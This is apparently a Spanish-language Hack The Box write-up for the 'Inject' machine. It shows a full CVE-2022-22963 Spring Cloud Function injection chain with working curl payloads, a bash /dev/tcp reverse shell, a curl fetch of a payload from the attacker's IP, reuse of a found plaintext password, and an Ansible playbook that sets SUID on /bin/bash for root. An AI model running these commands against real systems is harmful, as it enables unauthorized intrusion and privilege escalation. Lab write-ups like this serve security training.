---
layout: post
author: 4akatun
---

# Writeup
![Inject]({{'assets/img/Inject/inject.png' | relative_url}}) 

HACK-THE-BOX

-----------------------------------------------------------

Iniciamos el escaneo en la maquina victima.

```bash
# Nmap 7.93 scan initiated Tue Mar 21 20:39:10 2023 as: nmap -sCV -p22,8080 -oN targeted 10.10.11.204
Nmap scan report for 10.10.11.204
Host is up (0.049s latency).

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 caf10c515a596277f0a80c5c7c8ddaf8 (RSA)
|   256 d51c81c97b076b1cc1b429254b52219f (ECDSA)
|_  256 db1d8ceb9472b0d3ed44b96c93a7f91d (ED25519)
8080/tcp open  nagios-nsca Nagios NSCA
|_http-title: Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Mar 21 20:39:20 2023 -- 1 IP address (1 host up) scanned in 10.36 seconds
```
Analizo la pagina web, dado que no hay mucho mas.


![web-Inject]({{'/assets/img/Inject/web_inject.png' | relative_url}})

Veo esto, curioseando lo unico interesante en el apartado **upload**

![upload]({{'/assets/img/Inject/upload_inject.png' | relative_url}})

Solo admite archivos de imagen

![upload-result]({{'/assets/img/Inject/img_upload.png' | relative_url}})

Provare con cualquier imagen 

![upload-succes]({{'/assets/img/Inject/succesful_img.png' | relative_url}})

Bien, se ha subido correctamente y paso por **BurpSuite** la *url* de la imagen. Se ve lo siguiente...

![img-url]({{'/assets/img/Inject/burp_inject.png' | relative_url}})

Buscando algo de lo que aprovecharme, encuentro en la ruta **/var/www/WebApp** un 
archivo con nombre ***pom.xml***

![xml-file]({{'/assets/img/Inject/xml.png' | relative_url}})

Lo examino y encuentro algo y busco informacion para ver si me puedo aprovechar para poder subir 
archivos a la maquina victima. Dejo enlaces con la informacion ->
* Enlace [How to exploit CVE-2022-22963](https://sysdig.com/blog/cve-2022-22963-spring-cloud/)
* Enlace [Exploit](https://github.com/darryk10/CVE-2022-22963)

Probamos los comandos para subir un archivo *test* y ver que funcione.

```bash
❯ curl -X POST -H 'Host: 10.10.11.204:8080' -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(\"touch /tmp/test")' --data-binary 'exploit_poc' 'http://10.10.11.204:8080/functionRouter'
```
![test-file]({{'/assets/img/Inject/test_file_inject.png' | relative_url}})

Y lo tenemos, archivo subido, ahroa subimos nuestro archivo malicioso con un comando de **revers shell**

```bash
bash -i >& /dev/tcp/tu-ip/443 0>&1
```
Lo volvemo a subir con el comando anterior.

```bash
❯ curl -X POST -H 'Host: 10.10.11.204:8080' -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("curl 10.10.14.15/rever.sh -o /tmp/rever.sh")' --data-binary 'exploit_poc' 'http://10.10.11.204:8080/functionRouter'
```

![revers-file]({{'/assets/img/Inject/rever_inject.png' | relative_url}})

Ya esta, lo queda mandar otra orden para ejectar el archivo y estando en escucha en nuestro equipo con **netcat** obtenemos una **shell**

```bash
❯ curl -X POST -H 'Host: 10.10.11.204:8080' -H 'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("bash /tmp/rever.sh")' --data-binary 'exploit_poc' 'http://10.10.11.204:8080/functionRouter'
```

```
bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.15] from (UNKNOWN) [10.10.11.204] 40436
bash: cannot set terminal process group (820): Inappropriate ioctl for device
bash: no job control in this shell
bash-5.0$ whoami
whoami
frank
bash-5.0$ 
```
Estamo dentro como el usuario *frank*, tendremos que pivotar de usuario a *phil* para poder ver la flag de bajos privilegios.

```bash
bash-5.0$ cat settings.xml 
<?xml version="1.0" encoding="UTF-8"?>
<settings xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
  <servers>
    <server>
      <id>Inject</id>
      <username>phil</username>
      <password>DocPhillovestoInject123</password>
      <privateKey>${user.home}/.ssh/id_dsa</privateKey>
      <filePermissions>660</filePermissions>
      <directoryPermissions>660</directoryPermissions>
      <configuration></configuration>
    </server>
  </servers>
</settings>
bash-5.0$
```
Encuentro un archivo llamando **settings.xml** al que hechandole un vistazo vemos al usuario *phil* y una *contraseña* que probaremos para cambiar de usuario y ver si aun es valida.

```bash
bash-5.0$ su phil
Password:DocPhillovestoInject123
bash-5.0$ whoami
phil
bash-5.0$ cat /home/phil/user.txt 
e0c**************************fcb
bash-5.0$ 
```
Pareceser que es valida y podemos visualizar la flag, hora de continuar con la escalada.
Subimos el binario **linpeas** para analizar y buscar formas factibles de escalada de privilegios.


![linpeas]({{'/assets/img/Inject/linpeas.png' | relative_url}})

Veo este archivo en la ruta **/opt** el cual puede ser modificado, busco mas informacion para
ver de que se trata. Dejo lo enlaces ->

* Enlace [playbook-guide](https://docs.ansible.com/ansible/latest/playbook_guide/playbooks_intro.html)
* Enlace [playbook-guide-privilege-scalation](https://docs.ansible.com/ansible/latest/playbook_guide/playbooks_privilege_escalation.html)

Bien una vez analizada la informacion nos cramos nuestro archivo de nombre **pe.yml** al que le 
otorgare la capacidad de cambiar los permisos de **/bin/bash** para que sea **SUID**.

```yaml
 - hosts: localhost
   tasks:
     - name: 4aka pe
       shell: chmod +s /bin/bash
       become: true
```

Ya lo tenemos y esperdao unos segundos es ejecutado y obtenemos una *shell* con maximos privilegios,
vemos la flag final.

```bash
bash-5.0$ bash -p
bash-5.0# whoami
root
bash-5.0# cat /root/root.txt 
7f6**************************bf6
bash-5.0#
```
Esto es todo.

# Espero que te pueda servir de ayuda. *GRACIAS por venir*
